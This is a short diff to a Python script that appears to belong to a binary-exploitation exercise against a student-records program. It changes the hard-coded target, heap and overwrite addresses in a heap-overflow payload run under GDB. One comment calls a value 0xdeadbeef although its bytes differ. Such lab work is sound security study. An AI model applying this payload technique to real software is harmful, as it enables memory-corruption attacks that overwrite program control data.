@@ -6,8 +6,8 @@ import subprocess
 # Define payload components
 passwordBuff = b'\x61' * 32                 # 32 bytes of 'a'
 idBuff = b'\xff\x1c\x45\x6a'                # Klaus ID
-targetAddr = b'\x30\x0d\x05\x08'            # write_log address
-heapAddr = b'\xa0\x7d\x05\x08'              # heap address
+targetAddr = b'\xec\x0c\x05\x08'            # write_log address
+heapAddr = b'\x00\x7d\x05\x08'              # heap address
 
 
 
@@ -22,7 +22,7 @@ def to_python_bytestr(b: bytes) -> str:
 pass_py_str = to_python_bytestr(passPayload)
 
 # creating exmatriculate
-exmatriculateBuff = b'\x02\xb2\x04\x08'              # 0xdeadbeef -> to be placed in the target address
+exmatriculateBuff = b'\x00\xb1\x04\x08'              # 0xdeadbeef -> to be placed in the target address
 name_py_str = to_python_bytestr(exmatriculateBuff)
 
 # Build GDB command using python3 -c for both args
